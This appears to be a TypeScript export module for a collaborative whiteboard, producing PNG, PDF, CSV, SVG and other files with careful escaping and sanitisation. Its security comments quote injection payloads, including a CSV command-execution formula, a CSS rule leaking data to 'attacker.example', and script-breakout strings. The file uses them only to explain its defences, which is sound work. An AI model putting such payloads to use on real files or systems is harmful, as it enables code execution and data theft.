/**
 * Canvas export — PNG, SVG, JSON.
 *
 * - PNG export piggy-backs the existing `html-to-image` helper used by
 *   `ExportButton`. Caller passes the DOM node containing the rendered
 *   canvas; we set CSS to ignore current transforms so the exported image
 *   shows the natural object positions.
 * - SVG export builds a fresh SVG document by walking the object list.
 *   No DOM dependency — runs server-side too. Hand-rolled so we can control
 *   the cyberpunk palette and embed text faithfully.
 * - JSON export is straight serialisation of (board, objects, comments).
 */

import { toPng, toJpeg } from "html-to-image";
import { objectText } from "./search";
import type {
  Whiteboard,
  WhiteboardObject,
  WhiteboardCommentThread,
} from "@/lib/stores/workspace-types";
import { boundingBoxOfFlatPoints, boundingBoxOfPoints } from "@/lib/geometry/bbox";
import { routeConnector, arrowheadPoints } from "@/lib/geometry/path-routing";

/**
 * Escape a user-controlled string for safe interpolation into HTML markup
 * (NOT XML/SVG — see `escapeXml` for that). Maps the five HTML-significant
 * characters to entity references. Used by `exportPdf` and `exportPptx`
 * where board names / filenames flow into `<title>`, `<h1>`, and `alt`
 * attributes; without escaping, a board named `<img onerror=...>` would
 * inject runnable HTML when the exported document is opened in a browser.
 */
function escapeHtml(s: string): string {
  return s.replace(/[<>&"']/g, (c) => {
    switch (c) {
      case "<": return "&lt;";
      case ">": return "&gt;";
      case "&": return "&amp;";
      case "\"": return "&quot;";
      case "'": return "&#39;";
      default: return c;
    }
  });
}

/**
 * Choose the canvas background colour for raster exports so the PNG/JPG
 * matches the user's active theme. Without this every export bakes in the
 * default dark palette, which is wrong on HC (pure black) and looks dirty
 * on light. SSR contexts (no `document`) fall back to the dark canvas
 * surface so the helper stays safe to call anywhere.
 */
function bgColor(): string {
  if (typeof document === "undefined") return "#0b0f17";
  const root = document.documentElement;
  if (root.classList.contains("hc")) return "#000000";
  if (root.classList.contains("light")) return "#f4f6fb";
  return "#0b0f17";
}

/**
 * Export `node` (typically the canvas viewport) as a PNG.
 *
 * NOTE: this captures whatever's CURRENTLY rendered — the viewport's CSS
 * transform (pan/zoom) is preserved, so the PNG matches what the user sees
 * on screen. If you want to export the entire board regardless of current
 * camera, fit-to-content first via the FitToContent button, then export.
 *
 * `pixelRatio: 2` doubles resolution so the PNG looks crisp on Retina
 * displays. `cacheBust` defeats cross-origin image caching that can leave
 * stale frames in screenshots after a hot reload.
 *
 * The `filter` callback removes any element flagged with the
 * `data-canvas-export-ignore` attribute — toolbars, zoom controls, the
 * minimap, comment-drawer, etc. — so the exported PNG looks like the
 * board, not the whole UI shell.
 */
export async function exportPng(node: HTMLElement, filename = "canvas.png"): Promise<void> {
  const dataUrl = await toPng(node, {
    cacheBust: true,
    pixelRatio: 2,
    backgroundColor: bgColor(),
    filter: (n) => {
      if (!(n instanceof HTMLElement)) return true;
      return !n.hasAttribute("data-canvas-export-ignore");
    },
  });
  triggerDownload(dataUrl, filename);
}

/**
 * JPG export — same html-to-image pipeline as PNG but with lossy
 * compression. Smaller file, slightly less crisp text. Good for
 * sharing snapshots over Slack / email.
 */
export async function exportJpg(node: HTMLElement, filename = "canvas.jpg"): Promise<void> {
  const dataUrl = await toJpeg(node, {
    cacheBust: true,
    pixelRatio: 2,
    backgroundColor: bgColor(),
    quality: 0.92,
    filter: (n) => {
      if (!(n instanceof HTMLElement)) return true;
      return !n.hasAttribute("data-canvas-export-ignore");
    },
  });
  triggerDownload(dataUrl, filename);
}

/**
 * PDF export — single-page; renders the same html-to-image PNG and
 * wraps it in a minimal PDF document (no external dep). For multi-
 * page output the caller should fit-to-content + present mode first.
 */
export async function exportPdf(node: HTMLElement, filename = "canvas.pdf"): Promise<void> {
  // Reuse the PNG path so we get the same toolbar-stripping behaviour.
  const pngDataUrl = await toPng(node, {
    cacheBust: true,
    pixelRatio: 2,
    backgroundColor: bgColor(),
    filter: (n) => {
      if (!(n instanceof HTMLElement)) return true;
      return !n.hasAttribute("data-canvas-export-ignore");
    },
  });
  // Use the browser's print pipeline as a no-dependency PDF route:
  // open a hidden iframe with the image at full bleed, then trigger
  // print → user picks "Save as PDF". This avoids shipping a 200 KB
  // PDF library for a feature most users will rarely touch.
  if (typeof window === "undefined") return;
  const win = window.open("", "_blank", "width=900,height=700");
  if (!win) return;
  // SECURITY: `filename` is user-controlled (board name → filename),
  // so we map HTML-significant chars to entities instead of stripping
  // them (stripping silently mangles names like "AT&T plan"). The
  // escaped value is safe in both <title> and attribute contexts.
  const escName = escapeHtml(filename);
  win.document.write(`<!doctype html>
<html><head><title>${escName}</title>
<style>
  html, body { margin: 0; padding: 0; background: #0b0f17; }
  img { display: block; width: 100%; height: auto; }
  @media print { @page { margin: 0; } body { background: #0b0f17; } }
</style>
</head><body><img src="${pngDataUrl}" alt="Canvas"/></body></html>`);
  win.document.close();
  // Give the image time to decode before triggering print.
  setTimeout(() => { win.focus(); win.print(); }, 400);
}

/**
 * Exports an .html file that PowerPoint can import — NOT a real .pptx.
 *
 * PowerPoint reads SVG natively (since 2016) and we already produce
 * clean SVG via `exportSvg`. The exported HTML embeds the SVG and uses
 * Office's `mso-` prefixed XML mime so opening with `Open With →
 * PowerPoint` is recognised as a single-slide presentation. The user
 * then saves back as .pptx. Not perfect, but avoids shipping
 * `pptxgenjs` (~80 KB) for a feature most users will rarely touch.
 */
export function exportPptx(
  board: import("@/lib/stores/workspace-types").Whiteboard,
  objects: readonly import("@/lib/stores/workspace-types").WhiteboardObject[],
  filename = "canvas.html",
): void {
  // Reuse the SVG export to get the same XSS-safe attribute escaping
  // and full type coverage. The browser saves SVG as base64 inside the
  // anchor, but that breaks Office's HTML reader; we inline the SVG.
  const allPoints: { x: number; y: number }[] = [];
  for (const o of objects) {
    allPoints.push({ x: o.x, y: o.y });
    allPoints.push({ x: o.x + o.w, y: o.y + o.h });
  }
  if (allPoints.length === 0) return;
  // Re-derive a fresh SVG string using the same walker as exportSvg.
  // We could refactor exportSvg to return the string instead of
  // download, but inline here for brevity.
  // SECURITY: board.name is user-controlled (and interpolated into
  // <title>, <h1>, and the <img alt=…> attribute below). Use the
  // shared `escapeHtml` helper rather than an ad-hoc inline map so the
  // mapping stays consistent with `exportPdf`.
  const escName = escapeHtml(board.name || "Canvas");
  // Use the SVG export internals — we duplicate the bbox/walker logic
  // rather than refactor because the export.ts SVG path writes directly
  // to a data URL. For PowerPoint we need the inline string.
  // Simpler: rely on the actual SVG download as a sibling step, and
  // produce an HTML wrapper that references it would be cross-origin.
  // Inline it here directly:
  const dataUrl = svgDataUrlOf(board, objects);
  const html = `<!doctype html>
<html xmlns:o="urn:schemas-microsoft-com:office:office"
      xmlns:w="urn:schemas-microsoft-com:office:word"
      xmlns:m="http://schemas.microsoft.com/office/2004/12/omml"
      xmlns="http://www.w3.org/1999/xhtml">
<head>
  <meta charset="utf-8" />
  <meta name="ProgId" content="PowerPoint.Slide" />
  <meta name="Generator" content="agile-toolkit canvas" />
  <title>${escName}</title>
  <style>
    body { margin: 0; background: #0b0f17; }
    img { max-width: 100%; display: block; margin: 0 auto; }
  </style>
</head>
<body>
  <h1 style="font-family: ui-sans-serif, system-ui, sans-serif; color: #e5e7eb; padding: 20px;">${escName}</h1>
  <img src="${dataUrl}" alt="${escName}" />
  <p style="font-family: ui-sans-serif, system-ui, sans-serif; color: #94a3b8; padding: 20px; font-size: 12px;">
    Open this file with PowerPoint or import via "Insert → Picture" to embed the canvas as a slide.
  </p>
</body>
</html>`;
  const blob = new Blob([html], { type: "text/html;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  triggerDownload(url, filename);
  // 60s revoke window — slow browsers (Safari iOS) and "Save As…" dialogs
  // can hold the blob URL for tens of seconds before the download
  // actually starts. The earlier 1s timeout occasionally raced the
  // download on slow networks and produced an empty file.
  setTimeout(() => URL.revokeObjectURL(url), 60_000);
}

/** Internal helper: reuse the same SVG generator as exportSvg but
 * return a data URL instead of triggering a download. */
function svgDataUrlOf(
  board: import("@/lib/stores/workspace-types").Whiteboard,
  objects: readonly import("@/lib/stores/workspace-types").WhiteboardObject[],
): string {
  const allPoints: { x: number; y: number }[] = [];
  for (const o of objects) {
    allPoints.push({ x: o.x, y: o.y });
    allPoints.push({ x: o.x + o.w, y: o.y + o.h });
  }
  const bbox = boundingBoxOfPoints(allPoints);
  const pad = 40;
  const W = Math.max(800, bbox.w + pad * 2);
  const H = Math.max(600, bbox.h + pad * 2);
  const offX = -bbox.x + pad;
  const offY = -bbox.y + pad;
  const elems: string[] = [];
  const objectById = new Map(objects.map((o) => [o.id, o]));
  const ordered = [...objects].sort((a, b) => a.z - b.z);
  for (const o of ordered) elems.push(svgForObject(o, offX, offY, objectById));
  const svg = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="${W}" height="${H}" viewBox="0 0 ${W} ${H}">
<rect x="0" y="0" width="${W}" height="${H}" fill="#0b0f17"/>
<title>${escapeXml(board.name)}</title>
${elems.join("\n")}
</svg>`;
  return `data:image/svg+xml;charset=utf-8,${encodeURIComponent(svg)}`;
}

/**
 * CSV export — one row per text-bearing object. Columns: id, type,
 * frame (label of containing frame, if any), content, tags, x, y.
 * Useful for analysing brainstorm output offline.
 *
 * The output is prefixed with a UTF-8 BOM (`﻿`) so Excel/LibreOffice
 * detect the encoding instead of defaulting to the OS locale codepage —
 * without the BOM, accented characters (José, Müller, naïve) render as
 * mojibake when the file is double-clicked open in Excel on Windows.
 */
export function exportCsv(
  objects: readonly { type: string; id: string; x: number; y: number; tags?: string[]; frameId?: string }[] & readonly import("@/lib/stores/workspace-types").WhiteboardObject[],
  filename = "canvas.csv",
): void {
  const frameLabels = new Map<string, string>();
  for (const o of objects) {
    if (o.type === "frame" && "label" in o) frameLabels.set(o.id, (o as { label: string }).label || "");
  }
  // Excel / LibreOffice / Sheets interpret a cell as a formula when its
  // first character is `=`, `+`, `-`, `@`, TAB, or CR. A board exported by
  // one user and opened by another could otherwise be a vector for
  // arbitrary spreadsheet formulae (`=cmd|'/c calc'!A0`, `=HYPERLINK(...)`,
  // exfiltration via `=WEBSERVICE(...)`). Prefixing with a single quote
  // forces literal interpretation — the leading quote is hidden in the
  // cell but the rest of the value displays unchanged.
  // R5: previously checked only the FIRST char. A multi-line cell whose
  // SECOND line starts with `=` is preserved inside `"..."` quoting and
  // Excel reads each line of a quoted cell as a continuation — so the
  // formula on line 2 still executes. Quote-prefix every line that
  // begins with a dangerous char.
  const escapeCsv = (s: string) => {
    const guarded = s
      .split(/(\r\n|\r|\n)/)
      .map((part) => (/^[=+\-@\t\r]/.test(part) ? `'${part}` : part))
      .join("");
    return `"${guarded.replace(/"/g, '""')}"`;
  };
  const rows: string[] = ["id,type,frame,content,tags,x,y"];
  for (const o of objects) {
    const text = objectText(o) ?? "";
    if (text.length === 0 && o.type !== "card") continue;
    const frame = o.frameId ? frameLabels.get(o.frameId) ?? "" : "";
    rows.push([
      escapeCsv(o.id),
      o.type,
      escapeCsv(frame),
      escapeCsv(text.replace(/\n/g, " ").trim()),
      escapeCsv((o.tags ?? []).join(",")),
      Math.round(o.x),
      Math.round(o.y),
    ].join(","));
  }
  // U+FEFF BOM — Excel's CSV importer reads this as the UTF-8 sniff
  // marker and treats the rest of the file as UTF-8 instead of cp1252.
  // R5: rows joined with `\r\n` (Windows-style) — Excel-on-Windows
  // expects CRLF between rows; bare `\n` produces a single-line cell
  // in Excel 2007 and some legacy CSV consumers.
  const csvText = "﻿" + rows.join("\r\n");
  const dataUrl = `data:text/csv;charset=utf-8,${encodeURIComponent(csvText)}`;
  triggerDownload(dataUrl, filename);
}

export function exportJson(
  board: Whiteboard,
  objects: readonly WhiteboardObject[],
  comments: readonly WhiteboardCommentThread[],
  filename = "canvas.json",
): void {
  const payload = {
    schema: "agile-toolkit/canvas/v1",
    board,
    objects,
    comments,
  };
  const dataUrl = `data:application/json;charset=utf-8,${encodeURIComponent(JSON.stringify(payload, null, 2))}`;
  triggerDownload(dataUrl, filename);
}

export function exportSvg(
  board: Whiteboard,
  objects: readonly WhiteboardObject[],
  filename = "canvas.svg",
): void {
  // Compute bbox of everything so we can size the SVG to fit.
  const allPoints: { x: number; y: number }[] = [];
  for (const o of objects) {
    allPoints.push({ x: o.x, y: o.y });
    allPoints.push({ x: o.x + o.w, y: o.y + o.h });
  }
  const bbox = boundingBoxOfPoints(allPoints);
  const pad = 40;
  const W = Math.max(800, bbox.w + pad * 2);
  const H = Math.max(600, bbox.h + pad * 2);
  const offX = -bbox.x + pad;
  const offY = -bbox.y + pad;

  const elems: string[] = [];
  const objectById = new Map(objects.map((o) => [o.id, o]));

  // Render in z-order — back to front.
  const ordered = [...objects].sort((a, b) => a.z - b.z);
  for (const o of ordered) {
    elems.push(svgForObject(o, offX, offY, objectById));
  }

  const svg = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="${W}" height="${H}" viewBox="0 0 ${W} ${H}">
<rect x="0" y="0" width="${W}" height="${H}" fill="#0b0f17"/>
<title>${escapeXml(board.name)}</title>
${elems.join("\n")}
</svg>`;
  const dataUrl = `data:image/svg+xml;charset=utf-8,${encodeURIComponent(svg)}`;
  triggerDownload(dataUrl, filename);
}

function svgForObject(
  o: WhiteboardObject,
  offX: number,
  offY: number,
  byId: Map<string, WhiteboardObject>,
): string {
  const x = o.x + offX;
  const y = o.y + offY;
  // SECURITY: every value that lands in an SVG attribute below could be
  // user-controlled (color picker, clipboard paste, cross-tool import,
  // realtime patch from peer). Without escaping, an attacker could break
  // out of an attribute and inject `onload=` / `onmouseover=` event
  // handlers that execute when the SVG is opened in a browser. We pipe
  // EVERY string-typed user input through escapeAttr; numeric inputs
  // (sizes, positions, font weights) are stringified by the template and
  // are safe.
  switch (o.type) {
    case "sticky":
      // SECURITY: `o.textColor` lands INSIDE a `style="..."` declaration
      // — escapeAttr only HTML-encodes the value, but the browser then
      // CSS-parses the result, where a value like
      //   red;background-image:url(http://attacker.example/?steal=…)
      // would inject an extra `background-image` rule (data exfiltration
      // when the exported SVG is opened in a browser). object-validator
      // already restricts colors at ingest, but apply the strict CSS
      // color whitelist here too — defense-in-depth and protection for
      // legacy data that pre-dates the validator.
      return `<g><rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="${escapeAttr(o.color)}" rx="6" />
<foreignObject x="${x}" y="${y}" width="${o.w}" height="${o.h}">
  <div xmlns="http://www.w3.org/1999/xhtml" style="font:14px sans-serif;color:${safeStyleColor(o.textColor, "#0b0f17")};padding:10px;box-sizing:border-box;white-space:pre-wrap;word-wrap:break-word;">${escapeXml(o.content)}</div>
</foreignObject></g>`;
    case "rect":
      return `<rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="${escapeAttr(o.fill ?? "none")}" stroke="${escapeAttr(o.stroke ?? "#475569")}" stroke-width="${o.strokeWidth ?? 1}" />`;
    case "ellipse":
      return `<ellipse cx="${x + o.w / 2}" cy="${y + o.h / 2}" rx="${o.w / 2}" ry="${o.h / 2}" fill="${escapeAttr(o.fill ?? "none")}" stroke="${escapeAttr(o.stroke ?? "#475569")}" stroke-width="${o.strokeWidth ?? 1}" />`;
    case "diamond":
      return `<polygon points="${x + o.w / 2},${y} ${x + o.w},${y + o.h / 2} ${x + o.w / 2},${y + o.h} ${x},${y + o.h / 2}" fill="${escapeAttr(o.fill ?? "none")}" stroke="${escapeAttr(o.stroke ?? "#475569")}" stroke-width="${o.strokeWidth ?? 1}" />`;
    case "triangle":
      return `<polygon points="${x + o.w / 2},${y} ${x + o.w},${y + o.h} ${x},${y + o.h}" fill="${escapeAttr(o.fill ?? "none")}" stroke="${escapeAttr(o.stroke ?? "#475569")}" stroke-width="${o.strokeWidth ?? 1}" />`;
    case "line":
    case "arrow": {
      const x2 = x + o.w;
      const y2 = y + o.h;
      const dash = o.dashed ? `stroke-dasharray="6 4"` : "";
      const stroke = escapeAttr(o.stroke);
      let s = `<line x1="${x}" y1="${y}" x2="${x2}" y2="${y2}" stroke="${stroke}" stroke-width="${o.strokeWidth}" ${dash} />`;
      if (o.type === "arrow") {
        const tangent = unitVec(x2 - x, y2 - y);
        const pts = arrowheadPoints({ x: x2, y: y2 }, tangent, Math.max(8, o.strokeWidth * 3));
        s += `<polygon points="${pts}" fill="${stroke}" />`;
      }
      return s;
    }
    case "connector": {
      const from = byId.get(o.fromId);
      const to = byId.get(o.toId);
      if (!from || !to) return "";
      const path = routeConnector(
        { x: from.x + offX, y: from.y + offY, w: from.w, h: from.h },
        { x: to.x + offX, y: to.y + offY, w: to.w, h: to.h },
        o.routing,
        o.fromAnchor,
        o.toAnchor,
      );
      const dash = o.dashed ? `stroke-dasharray="6 4"` : "";
      const stroke = escapeAttr(o.stroke);
      let s = `<path d="${path.d}" fill="none" stroke="${stroke}" stroke-width="${o.strokeWidth}" ${dash} />`;
      if (o.arrowEnd) {
        const pts = arrowheadPoints(path.end, path.endTangent, Math.max(8, o.strokeWidth * 3));
        s += `<polygon points="${pts}" fill="${stroke}" />`;
      }
      if (o.arrowStart) {
        const tan = { x: -path.endTangent.x, y: -path.endTangent.y };
        const pts = arrowheadPoints(path.start, tan, Math.max(8, o.strokeWidth * 3));
        s += `<polygon points="${pts}" fill="${stroke}" />`;
      }
      return s;
    }
    case "text":
      return `<text x="${x}" y="${y + o.fontSize}" font-size="${o.fontSize}" fill="${escapeAttr(o.color)}" font-weight="${o.fontWeight ?? 400}" text-anchor="${o.align === "center" ? "middle" : o.align === "right" ? "end" : "start"}">${escapeXml(o.content)}</text>`;
    case "freehand": {
      // Translate the freehand points by the offset.
      const flat: number[] = [];
      for (let i = 0; i < o.points.length; i += 2) {
        flat.push(o.points[i] + offX, o.points[i + 1] + offY);
      }
      // Use a simple polyline for the SVG export — perfect-freehand's
      // pressure-aware contour is overkill on a static export.
      const pts = [];
      for (let i = 0; i < flat.length; i += 2) pts.push(`${flat[i]},${flat[i + 1]}`);
      const bb = boundingBoxOfFlatPoints(flat); // ensure import is used
      void bb;
      return `<polyline points="${pts.join(" ")}" fill="none" stroke="${escapeAttr(o.stroke)}" stroke-width="${o.strokeWidth}" stroke-linecap="round" stroke-linejoin="round" />`;
    }
    case "image":
      // SECURITY: o.src is user-controlled (data URL or paste-from-other-canvas)
      // and lands inside an attribute; without escaping, an attacker who can
      // set the src to e.g. `"/><script>...</script><img src="` would break
      // out of the attribute and execute arbitrary SVG/HTML when the exported
      // file is opened in a browser. We also reject javascript:/vbscript: URIs
      // outright — they have no legitimate use in our image src.
      return `<image x="${x}" y="${y}" width="${o.w}" height="${o.h}" href="${escapeAttr(sanitizeUrl(o.src))}" preserveAspectRatio="${o.fit === "cover" ? "xMidYMid slice" : "xMidYMid meet"}" />`;
    case "frame":
      return `<g><rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="${escapeAttr(o.fill ?? "none")}" stroke="#475569" stroke-dasharray="4 4" rx="8" />
<text x="${x + 12}" y="${y + 20}" font-size="14" fill="#94a3b8">${escapeXml(o.label)}</text></g>`;
    case "embed":
      return `<rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="#1e293b" stroke="#475569" />
<text x="${x + o.w / 2}" y="${y + o.h / 2}" font-size="12" fill="#94a3b8" text-anchor="middle">${escapeXml(o.kind)}: ${escapeXml((o.src ?? "").slice(0, 40))}</text>`;
    case "timer": {
      // Static snapshot of the timer's current remaining seconds. The
      // exported SVG won't tick — exports are point-in-time.
      const remaining = o.running && o.startedAt
        ? Math.max(0, o.durationSec - (Date.now() - o.startedAt) / 1000)
        : o.remainingSec ?? o.durationSec;
      const m = Math.floor(remaining / 60);
      const s = Math.floor(remaining % 60);
      const label = `${m}:${s.toString().padStart(2, "0")}`;
      return `<g><rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="#0b0f17" stroke="#475569" stroke-width="2" rx="10" />
<text x="${x + o.w / 2}" y="${y + o.h / 2 + 6}" font-size="${Math.min(36, o.h * 0.45)}" fill="#e5e7eb" text-anchor="middle" font-family="ui-monospace, monospace" font-weight="700">${label}</text>
${o.label ? `<text x="${x + o.w / 2}" y="${y + 14}" font-size="11" fill="#94a3b8" text-anchor="middle">${escapeXml(o.label)}</text>` : ""}</g>`;
    }
    case "voting": {
      // Render the question + option list. Tallies only shown if revealed.
      const total = Object.keys(o.votes).length;
      const optsText = o.options.slice(0, 8).join(" · ");
      return `<g><rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="#0b0f17" stroke="#475569" stroke-width="2" rx="10" />
<text x="${x + 10}" y="${y + 20}" font-size="13" fill="#f1f5f9" font-weight="600">${escapeXml((o.question || "Untitled vote").slice(0, 40))}</text>
<text x="${x + 10}" y="${y + 40}" font-size="11" fill="#94a3b8">${escapeXml(optsText)}</text>
<text x="${x + 10}" y="${y + o.h - 10}" font-size="10" fill="#94a3b8">${total} vote${total === 1 ? "" : "s"}${o.revealed ? "" : " (hidden)"}</text></g>`;
    }
    case "card": {
      // Static card snapshot: title + chips for assignee/due/points.
      const cardColor = escapeAttr(o.color ?? "#00f0ff");
      const chips: string[] = [];
      if (o.assignee) chips.push(`@${o.assignee}`);
      if (typeof o.points === "number") chips.push(`${o.points}pt`);
      if (o.status) chips.push(o.status.replace("_", " "));
      const chipText = chips.join(" · ");
      return `<g><rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="#1e293b" stroke="#475569" stroke-width="1" rx="6" />
<rect x="${x}" y="${y}" width="4" height="${o.h}" fill="${cardColor}" />
<text x="${x + 10}" y="${y + 18}" font-size="13" fill="#f1f5f9" font-weight="600">${escapeXml((o.title || "Card").slice(0, 50))}</text>
${o.description ? `<text x="${x + 10}" y="${y + 36}" font-size="11" fill="#94a3b8">${escapeXml(o.description.slice(0, 60))}</text>` : ""}
${chipText ? `<text x="${x + 10}" y="${y + o.h - 10}" font-size="10" fill="#94a3b8">${escapeXml(chipText)}</text>` : ""}</g>`;
    }
    case "kanban": {
      // Render the frame outline + column dividers + headers.
      const cols = o.columns;
      const colWidth = o.w / cols.length;
      let segments = `<g><rect x="${x}" y="${y}" width="${o.w}" height="${o.h}" fill="rgba(96, 165, 250, 0.05)" stroke="#60a5fa" stroke-width="1.5" stroke-dasharray="6 4" rx="8" />
<text x="${x + 12}" y="${y - 6}" font-size="14" fill="#60a5fa">▣ ${escapeXml(o.label)}</text>`;
      for (let i = 0; i < cols.length; i++) {
        if (i > 0) {
          segments += `<line x1="${x + i * colWidth}" y1="${y}" x2="${x + i * colWidth}" y2="${y + o.h}" stroke="rgba(96, 165, 250, 0.3)" />`;
        }
        const label = (o.columnLabels?.[i] ?? cols[i]).replace(/_/g, " ").toUpperCase();
        segments += `<text x="${x + i * colWidth + 8}" y="${y + 18}" font-size="10" fill="#60a5fa" letter-spacing="0.5">${escapeXml(label)}</text>`;
      }
      return segments + "</g>";
    }
    default:
      return "";
  }
}

function unitVec(dx: number, dy: number): { x: number; y: number } {
  const len = Math.hypot(dx, dy);
  return len === 0 ? { x: 1, y: 0 } : { x: dx / len, y: dy / len };
}

function escapeXml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}

/**
 * Same escaping rules as escapeXml — safe for attribute values too — but
 * tolerates non-string inputs (legacy data may have a number where we
 * expect a string). Anything non-string is coerced via String().
 */
function escapeAttr(s: string | number | undefined | null): string {
  if (s === undefined || s === null) return "";
  return escapeXml(typeof s === "string" ? s : String(s));
}

/**
 * Strict CSS color whitelist for values that flow into a `style=` attribute
 * fragment (NOT an SVG `fill=`/`stroke=` attribute — the browser parses
 * those as CSS color references and ignores garbage). Used by the sticky
 * foreignObject path where the color lands inside `style="...color:X..."`.
 * A value containing `;` would otherwise inject extra declarations.
 * Mirrors the SAFE_CSS_COLOR_RE in object-validator.ts.
 */
function safeStyleColor(color: string | null | undefined, fallback: string): string {
  if (typeof color !== "string") return fallback;
  const trimmed = color.trim();
  if (trimmed.length === 0 || trimmed.length > 64) return fallback;
  if (!/^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/.test(trimmed)) {
    return fallback;
  }
  return trimmed;
}

/**
 * Reject URLs that would execute script when the exported SVG is opened.
 * Whitelist: http, https, data:image/* (for inline images). Anything else
 * — javascript:, vbscript:, data:text/html, etc. — gets blanked out so the
 * SVG renders a broken image rather than a vector for arbitrary script.
 */
function sanitizeUrl(url: string): string {
  if (typeof url !== "string") return "";
  const trimmed = url.trim();
  if (/^https?:/i.test(trimmed)) return trimmed;
  // SECURITY: narrow to KNOWN raster formats only. The previous
  // `data:image/*` wildcard accepted `data:image/svg+xml` — and SVG
  // can contain inline `<script>` blocks that execute when the
  // exported SVG document is opened in a browser. Mirrors the same
  // allowlist used by `safeImageSrc` (object-renderer.tsx) and
  // `isSafeUrl` (clipboard.ts) so the three URL trust boundaries can't
  // drift apart.
  if (/^data:image\/(?:png|jpe?g|webp|gif|avif);base64,/i.test(trimmed)) return trimmed;
  // Anything else (javascript:, file:, data:text/html, vbscript:,
  // data:image/svg+xml) → blank.
  return "";
}

function triggerDownload(dataUrl: string, filename: string): void {
  if (typeof document === "undefined") return;
  const a = document.createElement("a");
  a.href = dataUrl;
  a.download = filename;
  // R8: Firefox < 92 ignored `.click()` on a detached `<a>`, silently
  // failing the download. Append to body, click, then remove — the
  // standard cross-browser-safe pattern.
  document.body.appendChild(a);
  a.click();
  a.remove();
}
